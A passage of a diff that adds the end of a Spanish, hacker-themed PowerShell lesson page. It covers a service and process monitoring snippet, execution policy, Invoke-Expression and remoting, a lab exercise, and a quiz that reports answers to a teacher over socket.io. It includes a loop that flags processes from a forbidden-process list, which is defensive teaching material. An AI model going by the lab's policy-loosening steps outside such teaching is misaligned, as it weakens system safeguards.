+<span class="keyword">foreach</span> (<span class="variable">$s</span> <span class="keyword">in</span> <span class="variable">$servicios</span>) {
+    <span class="keyword">if</span> ((<span class="command">Get-Service</span> <span class="variable">$s</span>).Status <span class="operator">-eq</span> <span class="string">"Stopped"</span>) {
+        <span class="command">Write-Host</span> <span class="string">"⚠️ $s detenido"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Red</span>
+    }
+}
+
+<span class="comment"># Buscar procesos sospechosos</span>
+<span class="keyword">foreach</span> (<span class="variable">$proc</span> <span class="keyword">in</span> <span class="variable">$procesosProhibidos</span>) {
+    <span class="variable">$encontrados</span> = <span class="command">Get-Process</span> <span class="parameter">-Name</span> <span class="variable">$proc</span> <span class="parameter">-ErrorAction</span> <span class="string">SilentlyContinue</span>
+    <span class="keyword">if</span> (<span class="variable">$encontrados</span>) {
+        <span class="command">Write-Host</span> <span class="string">"🚨 Proceso sospechoso detectado: $proc"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Red</span>
+    }
+}</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 7: Técnicas Avanzadas -->
+        <section id="advanced" class="mb-12">
+            <h2 class="section-title">> Sección 7: Técnicas Avanzadas - El Arsenal Completo</h2>
+            <div class="card">
+                <p>Estas técnicas separan a los novatos de los maestros. Son herramientas poderosas que requieren responsabilidad y conocimiento profundo.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Execution Policy: Las Reglas del Juego</h3>
+                <p>PowerShell tiene políticas de ejecución que controlan qué scripts pueden ejecutarse. Es una medida de seguridad, pero también un obstáculo para operaciones legítimas.</p>
+                <pre class="mt-2"><span class="comment"># Ver la política actual</span>
+<span class="command">Get-ExecutionPolicy</span>
+
+<span class="comment"># Cambiar temporalmente para permitir scripts locales</span>
+<span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">RemoteSigned</span> <span class="parameter">-Scope</span> <span class="string">Process</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Invoke-Expression: Ejecución Dinámica</h3>
+                <p>Permite ejecutar código PowerShell almacenado en strings. Poderoso pero peligroso.</p>
+                <pre class="mt-2"><span class="comment"># Construir y ejecutar un comando dinámicamente</span>
+<span class="variable">$comando</span> = <span class="string">"Get-Process | Where-Object {`$_.CPU -gt 100}"</span>
+<span class="command">Invoke-Expression</span> <span class="variable">$comando</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Remoting: Control a Distancia</h3>
+                <p>PowerShell puede ejecutar comandos en máquinas remotas. El sueño de todo administrador de red.</p>
+                <pre class="mt-2"><span class="comment"># Habilitar remoting en la máquina local (requiere admin)</span>
+<span class="command">Enable-PSRemoting</span> <span class="parameter">-Force</span>
+
+<span class="comment"># Ejecutar comando en máquina remota (ejemplo teórico)</span>
+<span class="command">Invoke-Command</span> <span class="parameter">-ComputerName</span> <span class="string">"Server01"</span> <span class="parameter">-ScriptBlock</span> { <span class="command">Get-Service</span> } <span class="parameter">-Credential</span> <span class="variable">$cred</span></pre>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #6: Laboratorio de Seguridad</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Verifica la política de ejecución actual de tu sistema.</li>
+                        <li>Crea un archivo de script (.ps1) con el código de monitoreo de la actividad anterior.</li>
+                        <li>Intenta ejecutarlo. ¿Qué ocurre?</li>
+                        <li>Cambia temporalmente la política de ejecución y vuelve a intentar.</li>
+                        <li>Restaura la política original por seguridad.</li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <!-- Quiz Interactivo -->
+        <section id="quiz-section" class="mb-12">
+            <h2 class="section-title">> EVALUACIÓN FINAL: Quiz de Operaciones PowerShell</h2>
+            <div class="card">
+                <div id="quiz-container">
+                    <div id="quiz-intro" class="text-center">
+                        <h3 class="text-2xl font-bold mb-4 text-purple-400">🎯 PROTOCOLO DE EVALUACIÓN INICIADO</h3>
+                        <p class="mb-6">10 preguntas para probar tu dominio de PowerShell. El sistema monitoreará tu progreso en tiempo real.</p>
+                        <div class="mb-4">
+                            <label for="student-name" class="block text-sm font-medium mb-2">Identificación del Operador:</label>
+                            <input type="text" id="student-name" class="bg-gray-800 border border-purple-500 rounded px-3 py-2 text-white" placeholder="Ingresa tu nombre">
+                        </div>
+                        <button id="start-quiz" class="bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-bold">
+                            🚀 INICIAR EVALUACIÓN
+                        </button>
+                    </div>
+
+                    <div id="quiz-content" class="hidden">
+                        <div class="flex justify-between items-center mb-6">
+                            <h3 class="text-xl font-bold text-purple-400">Pregunta <span id="current-question">1</span> de 10</h3>
+                            <div class="text-right">
+                                <div class="text-sm text-gray-400">Progreso</div>
+                                <div class="w-32 bg-gray-700 rounded-full h-2">
+                                    <div id="progress-bar" class="bg-purple-500 h-2 rounded-full transition-all duration-300" style="width: 10%"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="question-container">
+                            <div id="question-text" class="text-lg mb-6 text-cyan-300"></div>
+                            <div id="options-container" class="space-y-3"></div>
+                        </div>
+
+                        <div class="flex justify-between mt-8">
+                            <button id="prev-btn" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded disabled:opacity-50" disabled>
+                                ← Anterior
+                            </button>
+                            <button id="next-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">
+                                Siguiente →
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="quiz-results" class="hidden">
+                        <div class="text-center">
+                            <h3 class="text-3xl font-bold mb-4 text-green-400">🏆 EVALUACIÓN COMPLETADA</h3>
+                            <div class="bg-gray-800 border border-green-500 rounded-lg p-6 mb-6">
+                                <div class="text-4xl font-bold text-green-400 mb-2" id="final-score">0/10</div>
+                                <div class="text-lg" id="score-message"></div>
+                                <div class="text-sm text-gray-400 mt-2" id="completion-time"></div>
+                            </div>
+                            <div id="detailed-results" class="text-left"></div>
+                            <button id="restart-quiz" class="bg-purple-600 hover:bg-purple-700 text-white px-6 py-3 rounded-lg font-bold mt-4">
+                                🔄 REINICIAR EVALUACIÓN
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="text-center mt-12 mb-6">
+            <p class="text-sm text-gray-500">FIN DE LA TRANSMISIÓN. PROTOCOLO PS-HACK COMPLETADO.</p>
+        </footer>
+
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Configuración del socket
+        const socket = io();
+        
+        // Variables globales del quiz
+        let currentStudent = '';
+        let currentQuestionIndex = 0;
+        let studentAnswers = [];
+        let quizStartTime = null;
+        let quizResults = {};
+
+        // Banco de preguntas
+        const quizQuestions = [
+            {
+                question: "¿Cuál es el cmdlet correcto para listar todos los procesos en ejecución?",
+                options: [
+                    "List-Process",
+                    "Get-Process", 
+                    "Show-Process",
+                    "View-Process"
+                ],
+                correct: 1,
+                explanation: "Get-Process es el cmdlet estándar para obtener información sobre los procesos en ejecución en el sistema."
+            },
+            {
+                question: "¿Qué parámetro usarías para detener un proceso por su nombre usando Stop-Process?",
+                options: [
+                    "-ProcessName",
+                    "-Name",
+                    "-ID",
+                    "-Process"
+                ],
+                correct: 1,
+                explanation: "El parámetro -Name permite especificar el nombre del proceso que quieres detener."
+            },
+            {
+                question: "¿Cuál es la sintaxis correcta para usar el pipeline en PowerShell?",
+                options: [
+                    "Get-Process > Stop-Process",
+                    "Get-Process | Stop-Process",
+                    "Get-Process & Stop-Process",
+                    "Get-Process + Stop-Process"
+                ],
+                correct: 1,
+                explanation: "El símbolo | (pipe) envía la salida de un cmdlet como entrada al siguiente cmdlet en la cadena."
+            },
+            {
+                question: "¿Qué cmdlet usarías para obtener información sobre los servicios del sistema?",
+                options: [
+                    "Get-Service",
+                    "List-Service",
+                    "Show-Service",
+                    "View-Service"
+                ],
+                correct: 0,
+                explanation: "Get-Service lista todos los servicios instalados en el sistema y su estado actual."
+            },
+            {
+                question: "¿Cuál es el cmdlet correcto para cambiar el tipo de inicio de un servicio?",
+                options: [
+                    "Change-Service",
+                    "Modify-Service",
+                    "Set-Service",
+                    "Update-Service"
+                ],
+                correct: 2,
+                explanation: "Set-Service permite modificar las propiedades de un servicio, incluyendo su StartupType."
+            },
+            {
+                question: "¿Qué parámetro del cmdlet Get-WinEvent te permite filtrar eventos por tipo de log?",
+                options: [
+                    "-LogType",
+                    "-EventLog",
+                    "-FilterHashtable",
+                    "-Source"
+                ],
+                correct: 2,
+                explanation: "El parámetro -FilterHashtable permite crear filtros complejos, incluyendo LogName para especificar el tipo de log."
+            },
+            {
+                question: "¿Cuál es el algoritmo de hash más seguro disponible en Get-FileHash?",
+                options: [
+                    "MD5",
+                    "SHA1",
+                    "SHA256",
+                    "CRC32"
+                ],
+                correct: 2,
+                explanation: "SHA256 es considerado el más seguro entre las opciones disponibles. MD5 y SHA1 tienen vulnerabilidades conocidas."
+            },
+            {
+                question: "¿Qué estructura de control usarías para repetir una acción para cada elemento en una lista?",
+                options: [
+                    "if",
+                    "while",
+                    "foreach",
+                    "switch"
+                ],
+                correct: 2,
+                explanation: "foreach es la estructura específica para iterar sobre cada elemento de una colección o array."
+            },
+            {
+                question: "¿Cuál es la política de ejecución más restrictiva en PowerShell?",
+                options: [
+                    "Restricted",
+                    "AllSigned",
+                    "RemoteSigned",
+                    "Unrestricted"
+                ],
+                correct: 0,
+                explanation: "Restricted es la más restrictiva - no permite la ejecución de scripts, solo cmdlets y funciones."
+            },
+            {
+                question: "¿Qué cmdlet permite ejecutar comandos en máquinas remotas?",
+                options: [
+                    "Remote-Command",
+                    "Execute-Remote",
+                    "Invoke-Command",
+                    "Run-Remote"
+                ],
+                correct: 2,
+                explanation: "Invoke-Command permite ejecutar scripts y comandos en sistemas remotos que tengan habilitado PowerShell Remoting."
+            }
+        ];
+
+        // Función para copiar código al portapapeles
+        function initCodeCopyButtons() {
+            const pres = document.querySelectorAll('pre');
+            pres.forEach(pre => {
+                const button = document.createElement('button');
+                button.innerText = 'Copiar';
+                button.className = 'absolute top-2 right-2';
+                pre.style.position = 'relative';
+                pre.appendChild(button);
+
+                button.addEventListener('click', () => {
+                    const code = pre.cloneNode(true);
+                    const buttonElement = code.querySelector('button');
+                    if (buttonElement) {
+                        code.removeChild(buttonElement);
+                    }
+                    const text = code.innerText || code.textContent;
+                    
+                    navigator.clipboard.writeText(text).then(() => {
+                        button.innerText = '¡Copiado!';
+                        setTimeout(() => {
+                            button.innerText = 'Copiar';
+                        }, 2000);
+                    }).catch(() => {
+                        // Fallback para navegadores que no soporten la API moderna
+                        const el = document.createElement('textarea');
+                        el.value = text;
+                        document.body.appendChild(el);
+                        el.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(el);
+                        
+                        button.innerText = '¡Copiado!';
+                        setTimeout(() => {
+                            button.innerText = 'Copiar';
+                        }, 2000);
+                    });
+                });
+            });
+        }
+
+        // Funciones del Quiz
+        function startQuiz() {
+            const studentName = document.getElementById('student-name').value.trim();
+            if (!studentName) {
+                alert('Por favor, ingresa tu nombre antes de comenzar.');
+                return;
+            }
+
+            currentStudent = studentName;
+            currentQuestionIndex = 0;
+            studentAnswers = new Array(quizQuestions.length).fill(-1);
+            quizStartTime = new Date();
+            
+            // Notificar al profesor que un estudiante comenzó el quiz
+            socket.emit('lesson:quiz:started', {
+                student: currentStudent,
+                lesson: 'PowerShell CyberHack',
+                lessonType: 'cyberhack',
+                timestamp: quizStartTime
+            });
+
+            document.getElementById('quiz-intro').classList.add('hidden');
+            document.getElementById('quiz-content').classList.remove('hidden');
+            
+            showQuestion();
+        }
+
+        function showQuestion() {
+            const question = quizQuestions[currentQuestionIndex];
+            
+            document.getElementById('current-question').textContent = currentQuestionIndex + 1;
+            document.getElementById('question-text').textContent = question.question;
+            
+            const optionsContainer = document.getElementById('options-container');
+            optionsContainer.innerHTML = '';
+            
+            question.options.forEach((option, index) => {
+                const optionDiv = document.createElement('div');
+                optionDiv.className = 'quiz-option';
+                optionDiv.textContent = `${String.fromCharCode(65 + index)}. ${option}`;
+                
+                if (studentAnswers[currentQuestionIndex] === index) {
+                    optionDiv.classList.add('selected');
+                }
+                
+                optionDiv.addEventListener('click', () => selectOption(index));
+                optionsContainer.appendChild(optionDiv);
+            });
+            
+            updateProgress();
+            updateNavigationButtons();
+        }
+
+        function selectOption(optionIndex) {
+            studentAnswers[currentQuestionIndex] = optionIndex;
+            
+            // Actualizar visualización
+            const options = document.querySelectorAll('.quiz-option');
+            options.forEach((option, index) => {
+                option.classList.remove('selected');
+                if (index === optionIndex) {
+                    option.classList.add('selected');
+                }
+            });
+
+            // Notificar progreso al profesor
+            socket.emit('lesson:question:answered', {
+                student: currentStudent,
+                lesson: 'PowerShell CyberHack',
+                lessonType: 'cyberhack',
+                question: currentQuestionIndex + 1,
+                totalQuestions: quizQuestions.length,
+                selectedAnswer: quizQuestions[currentQuestionIndex].options[optionIndex],
+                isCorrect: optionIndex === quizQuestions[currentQuestionIndex].correct,
+                timestamp: new Date()
+            });
+        }
+
+        function updateProgress() {
+            const progress = ((currentQuestionIndex + 1) / quizQuestions.length) * 100;
+            document.getElementById('progress-bar').style.width = `${progress}%`;
+        }
+
+        function updateNavigationButtons() {
+            const prevBtn = document.getElementById('prev-btn');
+            const nextBtn = document.getElementById('next-btn');
+            
+            prevBtn.disabled = currentQuestionIndex === 0;
+            
+            if (currentQuestionIndex === quizQuestions.length - 1) {
+                nextBtn.textContent = 'Finalizar Quiz';
+                nextBtn.setAttribute('data-action', 'finish');
+            } else {
+                nextBtn.textContent = 'Siguiente →';
+                nextBtn.setAttribute('data-action', 'next');
+            }
+        }
+
+        function previousQuestion() {
+            if (currentQuestionIndex > 0) {
+                currentQuestionIndex--;
+                showQuestion();
+            }
+        }
+
+        function nextQuestion() {
+            if (currentQuestionIndex < quizQuestions.length - 1) {
+                currentQuestionIndex++;
+                showQuestion();
+            }
+        }
+
+        function finishQuiz() {
+            // Verificar que todas las preguntas estén respondidas
+            const unanswered = studentAnswers.findIndex(answer => answer === -1);
+            if (unanswered !== -1) {
+                if (!confirm(`Tienes preguntas sin responder (incluyendo la pregunta ${unanswered + 1}). ¿Estás seguro de que quieres finalizar?`)) {
+                    return;
+                }
+            }
+
+            calculateResults();
+            showResults();
+        }
+
+        function calculateResults() {
+            const quizEndTime = new Date();
+            const timeSpent = Math.round((quizEndTime - quizStartTime) / 1000); // en segundos
+            
+            let correctAnswers = 0;
+            const detailedResults = [];
+            
+            studentAnswers.forEach((answer, index) => {
+                const question = quizQuestions[index];
+                const isCorrect = answer === question.correct;
+                
+                if (isCorrect) correctAnswers++;
+                
+                detailedResults.push({
+                    question: question.question,
+                    studentAnswer: answer >= 0 ? question.options[answer] : 'Sin respuesta',
+                    correctAnswer: question.options[question.correct],
+                    isCorrect,
+                    explanation: question.explanation
+                });
+            });
+            
+            const score = Math.round((correctAnswers / quizQuestions.length) * 100);
+            
+            quizResults = {
+                student: currentStudent,
+                lesson: 'PowerShell CyberHack',
+                score,
+                correctAnswers,
+                totalQuestions: quizQuestions.length,
+                timeSpent,
+                detailedResults,
+                completedAt: quizEndTime
+            };
+
+            // Enviar resultados al profesor
+            socket.emit('lesson:quiz:completed', {
+                student: currentStudent,
+                lesson: 'PowerShell CyberHack',
+                lessonType: 'cyberhack',
+                score,
+                correctAnswers,
+                totalQuestions: quizQuestions.length,
+                timeSpent,
+                completedAt: quizEndTime,
+                detailedResults
+            });
+        }
+
+        function showResults() {
+            document.getElementById('quiz-content').classList.add('hidden');
+            document.getElementById('quiz-results').classList.remove('hidden');
+            
+            const { score, correctAnswers, totalQuestions, timeSpent, detailedResults } = quizResults;
+            
+            document.getElementById('final-score').textContent = `${correctAnswers}/${totalQuestions}`;
+            
+            let message = '';
+            if (score >= 90) message = '🎉 ¡EXCELENTE! Eres un verdadero maestro de PowerShell';
+            else if (score >= 80) message = '🔥 ¡MUY BIEN! Tienes un sólido dominio de PowerShell';
+            else if (score >= 70) message = '👍 BIEN. Sigues el camino correcto';
+            else if (score >= 60) message = '📚 REGULAR. Necesitas practicar más';
+            else message = '⚠️ NECESITAS MEJORAR. Revisa el material nuevamente';
+            
+            document.getElementById('score-message').textContent = message;
+            document.getElementById('completion-time').textContent = `Tiempo: ${Math.floor(timeSpent / 60)}:${(timeSpent % 60).toString().padStart(2, '0')}`;
+            
+            // Mostrar resultados detallados
+            const detailedContainer = document.getElementById('detailed-results');
+            detailedContainer.innerHTML = '<h4 class="text-lg font-bold mb-4 text-purple-400">📊 Análisis Detallado:</h4>';
+            
+            detailedResults.forEach((result, index) => {
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `quiz-feedback mb-4 ${result.isCorrect ? 'border-green-500' : 'border-red-500'}`;
+                resultDiv.style.borderLeftColor = result.isCorrect ? '#50fa7b' : '#ff5555';
+                
+                resultDiv.innerHTML = `
+                    <div class="font-bold text-sm mb-2 ${result.isCorrect ? 'text-green-400' : 'text-red-400'}">
+                        Pregunta ${index + 1}: ${result.isCorrect ? '✅ CORRECTO' : '❌ INCORRECTO'}
+                    </div>
+                    <div class="text-sm mb-2">${result.question}</div>
+                    <div class="text-xs text-gray-400 mb-1">Tu respuesta: ${result.studentAnswer}</div>
+                    <div class="text-xs text-green-300 mb-2">Respuesta correcta: ${result.correctAnswer}</div>
+                    <div class="text-xs text-blue-300">${result.explanation}</div>
+                `;
+                
+                detailedContainer.appendChild(resultDiv);
+            });
+        }
+
+        function restartQuiz() {
+            document.getElementById('quiz-results').classList.add('hidden');
+            document.getElementById('quiz-intro').classList.remove('hidden');
+            document.getElementById('student-name').value = '';
+            currentQuestionIndex = 0;
+            studentAnswers = [];
+            quizStartTime = null;
+            quizResults = {};
+        }
+
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            initCodeCopyButtons();
+            
+            // Quiz event listeners
+            document.getElementById('start-quiz').addEventListener('click', startQuiz);
+            document.getElementById('prev-btn').addEventListener('click', previousQuestion);
+            document.getElementById('next-btn').addEventListener('click', (e) => {
+                const action = e.target.getAttribute('data-action');
+                if (action === 'finish') {
+                    finishQuiz();
+                } else {
+                    nextQuestion();
+                }
+            });
+            document.getElementById('restart-quiz').addEventListener('click', restartQuiz);
+            
+            // Socket.io conexión
+            socket.on('connect', () => {
+                console.log('Conectado al servidor para monitoreo del quiz');
+            });
+            
+            socket.on('disconnect', () => {
+                console.log('Desconectado del servidor');
+            });
+        });
+    </script>
+</body>
+</html>
